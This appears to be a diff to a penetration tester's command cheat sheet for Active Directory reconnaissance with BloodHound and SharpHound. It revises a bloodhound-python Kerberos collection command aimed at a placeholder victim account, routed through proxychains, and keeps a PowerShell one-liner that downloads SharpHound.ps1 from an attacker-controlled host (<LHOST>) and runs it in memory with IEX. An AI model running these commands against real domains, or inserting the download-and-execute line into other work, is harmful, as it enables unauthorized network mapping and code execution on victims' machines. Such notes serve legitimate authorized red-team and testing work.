@@ -1,7 +1,7 @@
 % bloodhound, sharphound
 
-# bloodhound python kerberos (test needed)
-bloodhound-python -k -no-pass --auth-method kerberos -u <VICTIM>@<FQDN> -d <FQDN> -dc <HOSTNAME>.<FQDN> -ns <DNS_IP> -c All --dns-tcp --dns-timeout 20
+# bloodhound python kerberos (edit /etc/hosts case sensitive)
+sudo proxychains -q bloodhound-python -u <VICTIM> -k -no-pass -ns <DNS_IP> -dc <HOSTNAME>.<FQDN> -d <FQDN> -c all --dns-tcp --dns-timeout 500 --zip  --disable-pooling --auth-method kerberos
 
 # sharphound in memory powershell
 IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/SharpHound.ps1")
